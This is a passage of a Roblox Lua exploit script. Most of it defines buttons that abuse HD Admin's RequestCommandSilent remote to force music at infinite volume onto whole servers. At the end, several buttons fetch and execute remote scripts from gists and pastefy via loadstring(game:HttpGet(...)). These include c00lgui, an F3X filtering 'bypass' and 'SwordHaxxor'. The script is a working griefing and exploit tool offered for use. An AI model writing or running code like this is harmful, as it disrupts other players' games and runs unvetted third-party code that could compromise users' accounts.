SilentRequest:InvokeServer(";pitch .14")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Lo Tuyo basura",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 120471800715754")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Meepcity",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 132569789083172")
SilentRequest:InvokeServer(";pitch 0.143")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "MasterSword",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 97729048791539")
SilentRequest:InvokeServer(";pitch 0.096")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "PornHub",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 4813706721")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Money Machine",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 106282004905868")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Juju Falls",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 139955346288828")
SilentRequest:InvokeServer(";pitch 1.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Funky Town",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 70635213877495")
SilentRequest:InvokeServer(";pitch 0.1625")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Idk",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 73493639474942")
SilentRequest:InvokeServer(";pitch 0.142")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "I Wonder",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 78883853326072")
SilentRequest:InvokeServer(";pitch 0.13")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Hey Come On",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 132068938707992")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Justin Bieber",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 75278373350178")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Back Of My car",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 125931971467995")
SilentRequest:InvokeServer(";pitch 0.106")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Shotta Flow",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 128394588892703")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Cool Rap",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 87174269808530")
SilentRequest:InvokeServer(";pitch 0.1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Favorite Opp",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 84532879632694")
SilentRequest:InvokeServer(";pitch 0.2")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Sippingtea",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 70664470590697")
SilentRequest:InvokeServer(";pitch 0.125")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "k00pkidd theme",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 1839246711")
SilentRequest:InvokeServer(";pitch 0.9")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "I'm not so lucky",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 120785124326826")
SilentRequest:InvokeServer(";pitch 1.425")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Crazy Story pt3",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 111241909220773")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "new 4 jeeps",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 72884935040724")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "Boom",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 138394501994868")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
end
})
MusicAddButton({
    Name = "After you",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 2086899859")
SilentRequest:InvokeServer(";pitch .1")
SilentRequest:InvokeServer(";volume inf")
end
})





MusicAddButton({
    Name = "Unmusic",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music")
    end
})
ExtraAddButton({
    Name = "c00lgui f3x by b2s",
    Callback = function()

 loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/01812a5a4fe103d45556670067ef85e1/raw/c157a2f739b2de7c8336e890e40d96e3a6d548fd/c00lguiByBlue2Spooky"))()
        
    end
})
ExtraAddButton({
    Name = "Blue2spooky V5",
    Callback = function()
loadstring(game:HttpGet("https://pastefy.app/kb8eBe96/raw"))()
 
        
    end
})
ExtraAddButton({
    Name = "F3X Panel",
    Callback = function()
 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
    end
})
ExtraAddButton({
    Name = "F3X maps",
    Callback = function()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Aueuwd/Aya/refs/heads/main/f3xfebypass.txt'))()
        
    end
})
ExtraAddButton({
    Name = "SwordHaxxor Private",
    Callback = function()
loadstring(game:HttpGet('https://pastefy.app/KtBaQeQd/raw'))()
 
        
    end
})
-- Load F3X buttons by default
ShowF3XButtons()
